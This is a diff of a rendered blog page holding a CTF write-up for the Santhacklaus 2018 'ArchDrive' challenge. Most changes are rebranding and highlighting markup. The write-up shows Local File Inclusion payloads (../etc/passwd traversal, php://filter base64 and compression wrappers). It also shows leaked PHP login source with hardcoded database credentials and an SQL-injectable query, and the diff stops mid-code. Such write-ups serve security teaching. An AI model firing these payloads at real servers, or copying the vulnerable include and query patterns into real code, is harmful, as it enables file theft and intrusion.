@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.92.1" />
+<meta name="generator" content="Hugo 0.121.2">
 
   <meta property="og:title" content="[CTF - Santhacklaus-2018] ArchDrive" />
 <meta property="og:description" content="" />
@@ -44,7 +44,6 @@
   <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
 
   
-  <link href="" rel="alternate" type="application/rss+xml" title="Personnal security blog" />
 
     
   
@@ -105,9 +104,9 @@
 	
 
     <h1 class="brand-title">Thibaud Robin</h1>
-    <h2 class="brand-tagline">Alias Th1b4ud</h2>
+    <h2 class="brand-tagline">@Trackflaw</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity</p>
+    <p>Personnal (old) blog to speak about cybersecurity</p>
 
     <nav class="nav">
       <ul class="nav-list sidebar-list">
@@ -126,7 +125,7 @@
     <div class="social-buttons">
       
         
-        <a href="https://github.com/thibaudrobin" target="_blank"><i class='fab fa-github'></i></a>
+        <a href="https://github.com/trackflaw" target="_blank"><i class='fab fa-github'></i></a>
         
       
         
@@ -142,7 +141,7 @@
         
       
         
-        <a href="https://twitter.com/th1b4ud" target="_blank"><i class='fab fa-twitter'></i></a>
+        <a href="https://twitter.com/trackflaw" target="_blank"><i class='fab fa-twitter'></i></a>
         
       
       
@@ -231,10 +230,10 @@
 <p>Ok, the forgot password page is not really usefull. You can&rsquo;t enumerate some account, there is always the same message : <code>Email sent !</code>. But look further ! Look at the url and specifically to the arguments page. Look familiar to a vulnerability : Local File Inclusion. What it is a LFI ? Look at OWASP description : <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion</a></p>
 <p><code>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &quot;dynamic file inclusion&quot; mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</code></p>
 <p>There is below a vulnerable code to LFI. It’s really easy to prevent this type of vulnerability by adding some permissions checks before including the file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-    <span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]);
-<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>How can I check if this application is vulnerable to LFI. Really easy, just read the OWASP Guide : <code>http://vulnerable_host/preview.php?file=../../../../etc/passwd</code>. So for us, the example become : <a href="https://archdrive.santhacklaus.xyz/index.php?page=../../../../etc/passwd">https://archdrive.santhacklaus.xyz/index.php?page=../../../../etc/passwd</a>. If the server is an unix server, it will display the content of /etc/passwd, so all users of the server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>How can I check if this application is vulnerable to LFI. Really easy, just read the OWASP Guide : <code>http://vulnerable_host/preview.php?file=../../../../etc/passwd</code>. So for us, the example become : <a href="https://archdrive.santhacklaus.xyz/index.php?page=../../../../etc/passwd">https://archdrive.santhacklaus.xyz/index.php?page=../../../../etc/passwd</a>. If the server is an unix server, it will display the content of /etc/passwd, so all users of the server.</p>
 <p><img src="/img/santhacklaus/arch5.png" alt=""></p>
 <p>It works ! Congratz dude ! Look carefully to the last line. There is some great informations :</p>
 <ul>
@@ -246,12 +245,12 @@
 <p>We&rsquo;ve got a nice LFI. What can we do with LFI ? Execute some code, read some files and many more&hellip; I&rsquo;m a curious guy. I always want to know how developers made their applications. When you read the source code of <code>index.php</code>, you discover two others php pages : <code>login.php</code> and <code>reset.php</code>. So let&rsquo;s obtain all the source code !</p>
 <p>I can recommend you the Swissky CheatSheets : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>. Scroll to File Inclusion section : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal</a></p>
 <p>On this sheet, you have all you need to exploit a LFI. How can I extract the application source code ? With php wrappers of course ! Some examples :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
-http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
-http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
-http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
-http://example.com/index.php?page=php://filter/bzip2.compress/convert.base64-encode/resource=/etc/passwd
-</code></pre></div><div class="alert protips">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+</span></span><span style="display:flex;"><span>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+</span></span><span style="display:flex;"><span>http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+</span></span><span style="display:flex;"><span>http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+</span></span><span style="display:flex;"><span>http://example.com/index.php?page=php://filter/bzip2.compress/convert.base64-encode/resource=/etc/passwd
+</span></span></code></pre></div><div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
     <p class="text"><strong>ProTips</strong> : I recommend you to always use the 2 last wrappers. Sometimes files are more heavy than you think. It&#39;s usefull to compress them. 
     
@@ -262,94 +261,94 @@ http://example.com/index.php?page=php://filter/bzip2.compress/convert.base64-enc
 <p>Well done ! This the base64 code of the <code>reset.php</code> page. Let&rsquo;s decode this. As you can see, the data is not compressed (maybe file is too light) so you juste have to decode it.</p>
 <p><img src="/img/santhacklaus/arch8.png" alt=""></p>
 <p>We have some PHP code, sounds great !</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;?php session_start(); ?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
-&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
-   &lt;<span style="color:#f92672">head</span>&gt;
-      &lt;<span style="color:#f92672">title</span>&gt;Reset Your Password&lt;/<span style="color:#f92672">title</span>&gt;
-      &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
-      &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
-      &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/main.css&#34;</span>&gt;
-   &lt;/<span style="color:#f92672">head</span>&gt;
-   &lt;<span style="color:#f92672">body</span>&gt;
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;limiter&#34;</span>&gt;
-         &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container-login100&#34;</span>&gt;
-            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wrap-login100&#34;</span>&gt;
-               &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form validate-form&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?page=reset.php&#34;</span>&gt;
-                  &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-title p-b-48&#34;</span>&gt;
-                  &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logo-brand&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;images/archdrive-color.png&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ArchDrive logo&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
-                  &lt;/<span style="color:#f92672">span</span>&gt;
-                  &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-title p-b-26&#34;</span>&gt;
-                  ArchDrive
-                  &lt;/<span style="color:#f92672">span</span>&gt;
-                  &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-title&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;font-size: 24px&#34;</span>&gt;Reset My Password&lt;/<span style="color:#f92672">p</span>&gt;
-                  &lt;/<span style="color:#f92672">br</span>&gt;
-                  <span style="color:#75715e">&lt;?php
-</span><span style="color:#75715e">                     if(isset($_POST[&#39;recover&#39;]))
-</span><span style="color:#75715e">                     {
-</span><span style="color:#75715e">                     ?&gt;</span>
-                  &lt;<span style="color:#f92672">p</span>&gt;Email sent !&lt;/<span style="color:#f92672">p</span>&gt;
-                  <span style="color:#75715e">&lt;?php
-</span><span style="color:#75715e">                     }
-</span><span style="color:#75715e">                     ?&gt;</span>
-                  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wrap-input100 validate-input&#34;</span> <span style="color:#a6e22e">data-validate </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Valid email is: a@b.c&#34;</span>&gt;
-                     &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input100&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span>&gt;
-                     &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;focus-input100&#34;</span> <span style="color:#a6e22e">data-placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Email (only from @archdrive.corp)&#34;</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
-                  &lt;/<span style="color:#f92672">div</span>&gt;
-                  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container-login100-form-btn&#34;</span>&gt;
-                     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wrap-login100-form-btn&#34;</span>&gt;
-                        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-bgbtn&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
-                        &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-btn&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;recover&#34;</span>&gt;Recover Password&lt;/<span style="color:#f92672">button</span>&gt;
-                     &lt;/<span style="color:#f92672">div</span>&gt;
-                  &lt;/<span style="color:#f92672">div</span>&gt;
-               &lt;/<span style="color:#f92672">form</span>&gt;
-            &lt;/<span style="color:#f92672">div</span>&gt;
-         &lt;/<span style="color:#f92672">div</span>&gt;
-      &lt;/<span style="color:#f92672">div</span>&gt;
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dropDownSelect1&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
-      &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;js/main.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
-   &lt;/<span style="color:#f92672">body</span>&gt;
-&lt;/<span style="color:#f92672">html</span>&gt;
-</code></pre></div><p>Nothing really usefull with the reset page. Maybe more in the login page.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-<span style="color:#a6e22e">session_start</span>();
-$state <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
-
-<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>])) {
-    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;pass&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;pass&#39;</span>])) {
-
-        $bdd <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_connect</span>(<span style="color:#e6db74">&#39;database:3306&#39;</span>, <span style="color:#e6db74">&#39;archdrive-corpo-bdd-admin&#39;</span>, <span style="color:#e6db74">&#39;8mkxdcwwyvtk36snF2b4TcEqSjh4Cc&#39;</span>, <span style="color:#e6db74">&#39;ctf-archdrive-corp&#39;</span>);
-
-        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mysqli_connect_errno</span>()) {
-            $state<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">return</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>;
-            $state<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">string</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Connection error&#39;</span>;
-            $state_json <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>($state);
-            <span style="color:#66d9ef">echo</span> $state_json;
-            <span style="color:#66d9ef">return</span>;
-        }
-
-        $user <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_real_escape_string</span>($bdd, <span style="color:#a6e22e">strtolower</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]));
-        $pass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>];
-
-        $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT user,password FROM `access-users` WHERE user=&#39;&#34;</span> <span style="color:#f92672">.</span> $user <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39; AND password=&#39;&#34;</span> <span style="color:#f92672">.</span> $pass <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>;
-
-        $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_query</span>($bdd, $sql);
-
-        $num_row <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_num_rows</span>($res);
-        $row <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_fetch_assoc</span>($res);
-
-        <span style="color:#66d9ef">if</span> ($num_row <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> $user <span style="color:#f92672">===</span> $row[<span style="color:#e6db74">&#39;user&#39;</span>]) {
-            $state<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">return</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;true&#39;</span>;
-            $_SESSION[<span style="color:#e6db74">&#39;logged&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: myfiles.php&#34;</span>);
-        } <span style="color:#66d9ef">else</span> {
-            $state<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">return</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;false&#39;</span>;
-            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: index.php&#34;</span>);
-        }
-    }
-}
-<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>There are severals interestings things here :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;?php session_start(); ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">title</span>&gt;Reset Your Password&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/main.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;limiter&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container-login100&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wrap-login100&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>               &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form validate-form&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?page=reset.php&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                  &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-title p-b-48&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                  &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logo-brand&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;images/archdrive-color.png&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ArchDrive logo&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>                  &lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>                  &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-title p-b-26&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                  ArchDrive
+</span></span><span style="display:flex;"><span>                  &lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>                  &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-title&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;font-size: 24px&#34;</span>&gt;Reset My Password&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>                  &lt;/<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>                  <span style="color:#75715e">&lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                     if(isset($_POST[&#39;recover&#39;]))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                     {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                     ?&gt;</span>
+</span></span><span style="display:flex;"><span>                  &lt;<span style="color:#f92672">p</span>&gt;Email sent !&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>                  <span style="color:#75715e">&lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                     }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                     ?&gt;</span>
+</span></span><span style="display:flex;"><span>                  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wrap-input100 validate-input&#34;</span> <span style="color:#a6e22e">data-validate </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Valid email is: a@b.c&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                     &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input100&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                     &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;focus-input100&#34;</span> <span style="color:#a6e22e">data-placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Email (only from @archdrive.corp)&#34;</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>                  &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>                  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container-login100-form-btn&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wrap-login100-form-btn&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-bgbtn&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>                        &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login100-form-btn&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;recover&#34;</span>&gt;Recover Password&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>                     &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>                  &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>               &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dropDownSelect1&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;js/main.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>Nothing really usefull with the reset page. Maybe more in the login page.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>$state <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;pass&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;pass&#39;</span>])) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $bdd <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_connect</span>(<span style="color:#e6db74">&#39;database:3306&#39;</span>, <span style="color:#e6db74">&#39;archdrive-corpo-bdd-admin&#39;</span>, <span style="color:#e6db74">&#39;8mkxdcwwyvtk36snF2b4TcEqSjh4Cc&#39;</span>, <span style="color:#e6db74">&#39;ctf-archdrive-corp&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mysqli_connect_errno</span>()) {
+</span></span><span style="display:flex;"><span>            $state<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">return</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>;
+</span></span><span style="display:flex;"><span>            $state<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">string</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Connection error&#39;</span>;
+</span></span><span style="display:flex;"><span>            $state_json <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>($state);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $state_json;
